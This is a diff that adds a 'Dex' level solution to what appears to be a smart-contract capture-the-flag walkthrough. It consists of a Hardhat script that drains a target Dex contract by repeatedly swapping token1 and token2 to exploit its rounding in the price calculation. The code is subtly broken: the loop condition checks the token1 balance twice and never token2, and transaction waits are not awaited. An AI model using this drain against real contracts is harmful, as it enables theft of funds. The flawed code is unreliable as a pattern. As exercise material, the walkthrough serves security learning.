@@ -807,3 +807,73 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 ```
+
+## 22 Dex
+
+Change the Dex.sol imports to be
+- `@openzeppelin/contracts/token/ERC20/IERC20.sol`
+- `@openzeppelin/contracts/token/ERC20/ERC20.sol`
+- `@openzeppelin/contracts/access/Ownable.sol`
+And run `npm install @openzeppelin/contracts`
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const targetAddress = "<target contract address>";
+  const targetContract = (await hre.ethers.getContractFactory("Dex")).attach(targetAddress);
+  const [ token1, token2 ] = [ await targetContract.token1(), await targetContract.token2() ];
+
+  const [ signer ] = await hre.ethers.getSigners();
+
+  const calculateAmounts = async fromToken1 => {
+    const [ fromToken, toToken ] = fromToken1 ? [ token1, token2 ] : [ token2, token1 ];
+    const playerFromBalance = await targetContract.balanceOf(fromToken, signer.address);
+    const contractFromBalance = await targetContract.balanceOf(fromToken, targetAddress);
+    const contractToBalance = await targetContract.balanceOf(toToken, targetAddress);
+
+    const amount = playerFromBalance < contractFromBalance ? playerFromBalance : contractFromBalance;
+    const swapAmount = amount * contractToBalance / contractFromBalance; // BigInt integer division
+    return [ amount, swapAmount ];
+  };
+
+  while ((await targetContract.balanceOf(token1, targetAddress)) > 0 &&
+         (await targetContract.balanceOf(token1, targetAddress)) > 0)
+  {
+    const [ amount1, swapAmount1 ] = await calculateAmounts(true);
+
+    console.log(
+      "Target, Player, amount swapAmount = " +
+      `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
+      `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}, ` +
+      `${amount1} ${swapAmount1}`
+    );
+
+    (await targetContract.approve(targetAddress, amount1)).wait();
+    (await targetContract.swap(token1, token2, amount1)).wait();
+
+    const [ amount2, swapAmount2 ] = await calculateAmounts(false);
+
+    console.log(
+      "Target, Player, amount swapAmount = " +
+      `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
+      `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}, ` +
+      `${amount2} ${swapAmount2}`
+    );
+
+    (await targetContract.approve(targetAddress, amount2)).wait();
+    (await targetContract.swap(token2, token1, amount2)).wait();
+  }
+
+  console.log(
+    "Target, Player = " +
+    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
+    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`,
+  );
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
